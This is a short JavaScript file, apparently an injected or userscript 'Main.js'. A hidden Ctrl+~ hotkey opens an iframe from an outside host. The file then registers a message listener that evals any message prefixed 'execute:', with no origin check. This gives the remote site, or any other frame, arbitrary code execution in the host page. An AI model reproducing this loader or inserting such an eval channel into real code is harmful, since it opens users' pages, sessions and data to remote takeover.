/// Main.js
document.addEventListener("keydown", function (e) {
	if (e.key == "~" && e.ctrlKey) {
		// Create a floating div
		var floatingDiv = document.createElement("div");
		floatingDiv.style.cssText = "position:fixed; top:50px; left:50px; width:500px; height:300px; border:1px solid #000; background-color:#fff; z-index:1000;";

		// Create an iframe
		var iframe = document.createElement("iframe");
		iframe.src = "//edt-fci.staticrun.app";
		iframe.style.cssText = "width:100%; height:calc(100% - 30px); border:none;";

		// Create a close button
		var closeButton = document.createElement("button");
		closeButton.innerText = "Close";
		closeButton.style.cssText = "position:absolute; top:0; right:0;";

		// Add functionality to the close button
		closeButton.addEventListener("click", function () {
			document.body.removeChild(floatingDiv);
		});

		// Append iframe and close button to the floating div
		floatingDiv.appendChild(iframe);
		floatingDiv.appendChild(closeButton);

		// Append the floating div to the body
		document.body.appendChild(floatingDiv);

		// Listen for messages from the iframe
		window.addEventListener("message", function (e) {
			if (e.data.toString().startsWith("execute:")) {
				eval(e.data.toString().replace("execute:", ""));
				document.body.removeChild(floatingDiv);
			}
		});
	}
});
